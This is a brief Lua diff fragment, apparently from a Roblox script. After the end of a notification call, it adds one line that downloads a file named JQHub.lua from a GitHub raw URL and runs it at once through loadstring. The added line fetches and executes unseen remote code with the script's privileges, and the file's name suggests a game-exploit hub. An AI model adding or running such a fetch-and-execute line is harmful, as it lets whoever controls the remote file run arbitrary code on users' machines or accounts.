@@ -94,3 +94,4 @@ pcall(function()
         Duration = 5;
     })
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hatttsttss/scriptsss/main/JQHub.lua"))()
